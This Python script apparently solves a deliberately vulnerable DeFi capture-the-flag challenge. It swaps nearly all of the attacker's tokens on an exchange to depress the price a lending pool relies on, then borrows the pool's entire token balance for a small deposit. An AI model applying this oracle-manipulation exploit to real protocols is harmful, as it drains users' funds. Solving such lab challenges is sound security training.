from scripts.deploy import (
    ATTACKER_INITIAL_TOKEN_BALANCE,
    POOL_INITIAL_TOKEN_BALANCE,
)
from brownie import chain


def exploit(exchange, lending_pool, attacker_account, dvt):

    dvt.approve(exchange, ATTACKER_INITIAL_TOKEN_BALANCE, {'from': attacker_account})

    deadline = chain[-1].timestamp * 2

    exchange.tokenToEthSwapInput(
        ATTACKER_INITIAL_TOKEN_BALANCE - 1, 1, deadline, {'from': attacker_account}
    )

    deposit_required = lending_pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
    lending_pool.borrow(
        POOL_INITIAL_TOKEN_BALANCE,
        {'from': attacker_account, 'value': deposit_required},
    )
